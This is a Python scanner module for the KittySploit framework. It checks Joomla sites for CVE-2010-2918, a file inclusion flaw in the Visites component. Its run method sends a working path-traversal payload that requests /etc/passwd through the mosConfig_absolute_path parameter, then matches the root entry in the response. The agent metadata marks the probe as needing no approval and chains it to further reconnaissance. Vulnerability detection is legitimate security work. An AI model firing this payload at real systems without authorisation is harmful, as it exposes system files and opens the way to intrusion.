#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A PHP remote file inclusion vulnerability in core/include/myMailer."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component Visites 1.1 - MosConfig_absolute_path Remote File Inclusion Detection',
        'description': 'A PHP remote file inclusion vulnerability in core/include/myMailer.class.php in the Visites (com_joomla-visites) component 1.1 RC2 for Joomla! allows remote attackers to execute arbitrary PHP code via a URL in the mosConfig_absolute_path parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'edb', 'visocrea', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/31708',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-2918',
            'https://www.exploit-db.com/exploits/14476',
            'http://www.vupen.com/english/advisories/2010/1925',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/42025',
        ],
        'cve': 'CVE-2010-2918',
    }

    def run(self):
        r = self.http_request(method="GET", path='/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Component Visites 1.1 - MosConfig_absolute_path Remote File Inclusion detected",
                path='/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

